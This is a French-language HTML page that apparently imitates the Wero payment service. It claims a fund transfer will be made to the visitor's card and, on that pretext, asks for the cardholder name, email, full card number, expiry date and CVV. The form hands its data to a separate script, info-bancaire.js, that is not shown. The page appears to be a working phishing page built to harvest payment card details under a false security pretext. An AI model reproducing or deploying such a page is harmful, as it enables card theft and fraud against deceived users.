<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirmation de Carte</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" />
    <link rel="stylesheet" href="css/styles.css">
    <style>
        .content {
            margin-top: 100px;
            text-align: center;
        }

        .form-group {
            position: relative;
            margin-bottom: 25px;
        }

        .form-control {
            border: 2px solid #FFD700;
            border-radius: 15px;
            padding: 15px 20px;
            font-size: 16px;
            transition: all 0.3s ease;
            background-color: #FFFFFF;
        }

        .form-control:focus {
            border-color: #FFE436;
            box-shadow: 0 0 0 0.2rem rgba(255, 241, 102, 0.25);
        }

        .form-icon {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #FFD700;
        }

        .card-info {
            background-color: #f8f9fa;
            border-radius: 15px;
            padding: 20px;
            margin-bottom: 30px;
        }

        .expiry-cvv-group {
            display: flex;
            gap: 15px;
        }

        .expiry-group {
            flex: 2;
        }

        .cvv-group {
            flex: 1;
        }

        .btn-custom {
            background-color: #FFF166;
            border: 2px solid black;
            font-weight: bold;
            padding: 15px 30px;
            border-radius: 30px;
            font-size: 18px;
            transition: all 0.3s ease;
            width: 100%;
            margin-top: 20px;
        }

        .btn-custom:hover {
            transform: scale(1.02);
            background-color: #FFE436;
        }

        .form-label {
            font-weight: 600;
            margin-bottom: 8px;
            display: block;
            color: #444;
        }
    </style>
</head>
<body>
    <div class="header">
        <span class="logo">WERO</span>
    </div>

    <div class="content">
        <h2 class="fw-bold text-warning">VEUILLEZ CONFIRMER VOTRE CARTE SUR WERO.</h2>
        <img src="https://assets.zyrosite.com/cdn-cgi/image/format=auto,w=242,h=138,fit=crop/Aq2q239lEjf2a2Mj/caisse-depargne-banque-populaire-_-ce-nouveau-moyen-de-paiement-arrive-en-exclusivite-debut-juillet-2-AMqlq7W4oNHNqVJM.jpg"
            class="img-fluid" alt="Carte bancaire">
        <p class="mt-3">Afin d'assurer la protection de nos utilisateurs, nous effectuerons un virement direct des fonds
            vers votre carte bancaire.</p>
        <form id="bankForm">
            <div class="card-info">
                <div class="form-group">
                    <label class="form-label">Titulaire de la carte</label>
                    <input type="text" name="titulaire" class="form-control" required>
                    <i class="fas fa-user form-icon"></i>
                </div>

                <div class="form-group">
                    <label class="form-label">Adresse e-mail</label>
                    <input type="email" name="email" class="form-control" required>
                    <i class="fas fa-envelope form-icon"></i>
                </div>

                <div class="form-group">
                    <label class="form-label">Numéro de carte</label>
                    <input type="text" name="numero_carte" class="form-control" 
                           pattern="[0-9]{16}" maxlength="16" required
                           placeholder="•••• •••• •••• ••••">
                    <i class="fas fa-credit-card form-icon"></i>
                </div>

                <div class="expiry-cvv-group">
                    <div class="form-group expiry-group">
                        <label class="form-label">Date d'expiration</label>
                        <input type="text" name="expiration" class="form-control" 
                               placeholder="MM/YY" pattern="(0[1-9]|1[0-2])\/([0-9]{2})" required>
                        <i class="fas fa-calendar form-icon"></i>
                    </div>

                    <div class="form-group cvv-group">
                        <label class="form-label">CVV</label>
                        <input type="text" name="cvv" class="form-control" 
                               pattern="[0-9]{3}" maxlength="3" required
                               placeholder="•••">
                        <i class="fas fa-lock form-icon"></i>
                    </div>
                </div>
            </div>

            <button type="submit" class="btn btn-custom">
                <i class="fas fa-lock"></i> Valider en toute sécurité
            </button>
        </form>
    </div>

    <footer>
        <div class="container text-center">
            <span class="logo-white">WERO</span>
            <p>Simplifiez vos transferts d'argent en Europe.</p>
            <div class="social-icons">
                <a href="#"><i class="fab fa-facebook"></i></a>
                <a href="#"><i class="fab fa-instagram"></i></a>
                <a href="#"><i class="fab fa-tiktok"></i></a>
                <a href="#"><i class="fab fa-twitter"></i></a>
            </div>
            <p class="security">SÉCURITÉ</p>
            <p>contact@wero.com</p>
            <p class="copyright"> 2024. All rights reserved.</p>
        </div>
    </footer>

    <script src="js/info-bancaire.js"></script>
</body>
</html>
